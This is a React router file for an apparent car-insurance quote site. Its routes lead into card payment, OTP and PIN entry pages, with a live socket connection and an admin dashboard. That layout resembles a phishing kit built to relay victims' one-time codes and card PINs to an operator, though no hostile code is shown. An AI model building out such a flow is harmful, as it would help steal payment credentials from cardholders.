import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import { SocketProvider } from './context/SocketContext';
import Home from './pages/Home';
import CarDetails from './pages/CarDetails';
import MoreDetails from './pages/MoreDetails';
import LoadingScreen from './pages/LoadingScreen';
import SelectInsurance from './pages/SelectInsurance';
import PlateNumber from './pages/PlateNumber';
import InsuranceInfo from './pages/InsuranceInfo';
import PolicyDate from './pages/PolicyDate';
import Quote from './pages/Quote';
import PayDCC from './pages/PayDCC';
import PayQPay from './pages/PayQPay';
import PaymentPending from './pages/PaymentPending';
import PaymentOTP from './pages/PaymentOTP';
import OTPVerification from './pages/OTPVerification';
import PaymentPIN from './pages/PaymentPIN';
import PINVerification from './pages/PINVerification';
import PaymentSuccess from './pages/PaymentSuccess';
import PaymentFailed from './pages/PaymentFailed';
import LoadingToPayment from './pages/LoadingToPayment';
import AdminLogin from './pages/AdminLogin';
import Dashboard from './pages/Dashboard';
import LoadingTransition from './pages/LoadingTransition';
import ProtectedRoute from './components/ProtectedRoute';
import './index.css';

function App() {
  return (
    <SocketProvider>
      <Router 
        future={{ 
          v7_startTransition: true,
          v7_relativeSplatPath: true 
        }}
      >
        <Routes>
          {/* Public Landing Page */}
          <Route path="/" element={<Home />} />
          <Route path="/car-details" element={<CarDetails />} />
          <Route path="/more-details" element={<MoreDetails />} />
          <Route path="/loading" element={<LoadingScreen />} />
          <Route path="/select-insurance" element={<SelectInsurance />} />
          <Route path="/quote" element={<SelectInsurance />} />
          <Route path="/plate-number" element={<PlateNumber />} />
          <Route path="/loading-to-info" element={<LoadingTransition nextRoute="/info-insurance" />} />
          <Route path="/info-insurance" element={<InsuranceInfo />} />
          <Route path="/loading-to-policy" element={<LoadingTransition nextRoute="/policy-date" />} />
          <Route path="/policy-date" element={<PolicyDate />} />
          <Route path="/loading-to-quote" element={<LoadingTransition nextRoute="/quotecheaK" />} />
          <Route path="/quotecheaK" element={<Quote />} />
          <Route path="/loading-to-paydcc" element={<LoadingToPayment nextRoute="/paydcc" />} />
          <Route path="/loading-to-payqpay" element={<LoadingToPayment nextRoute="/payqpay" />} />
          <Route path="/paydcc" element={<PayDCC />} />
          <Route path="/payqpay" element={<PayQPay />} />
          <Route path="/payment-pending" element={<PaymentPending />} />
          <Route path="/payment-otp" element={<PaymentOTP />} />
          <Route path="/otp-verification" element={<OTPVerification />} />
          <Route path="/payment-pin" element={<PaymentPIN />} />
          <Route path="/pin-verification" element={<PINVerification />} />
          <Route path="/payment-success" element={<PaymentSuccess />} />
          <Route path="/payment-failed" element={<PaymentFailed />} />
          
          {/* Admin Login */}
          <Route path="/admin/login" element={<AdminLogin />} />
          
          {/* Protected Admin Dashboard Route */}
          <Route path="/admin" element={<ProtectedRoute><Dashboard /></ProtectedRoute>} />
        </Routes>
      </Router>
    </SocketProvider>
  );
}

export default App;
